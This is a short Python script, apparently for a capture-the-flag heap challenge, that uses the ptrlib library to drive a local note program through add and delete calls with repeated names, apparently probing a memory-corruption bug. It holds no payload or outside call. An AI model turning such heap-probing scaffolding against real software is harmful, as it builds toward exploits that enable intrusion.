from ptrlib import *
import random

def add(name, data):
    sock.sendlineafter("> ", "1")
    sock.sendafter("> ", name)
    sock.sendafter("> ", data)
def delete(name):
    sock.sendlineafter("> ", "2")
    sock.sendafter("> ", name)
def edit(name, data):
    sock.sendlineafter("> ", "3")
    sock.sendafter("> ", name)
    sock.sendafter("> ", data)
def view():
    sock.sendlineafter("> ", "4")

sock = Process("./HNoteFixed")
#sock = Process("./DebugNote",
#               env={"ASAN_OPTIONS":"alloc_dealloc_mismatch=0"})

add(b'A', b'A')
add(b'B', b'B')
add(b'C', b'C')
delete(b'B')
add(b'C', b'C')
delete(b'A')
add(b'C', b'XXXXXX')
delete(b'C')

sock.interactive()
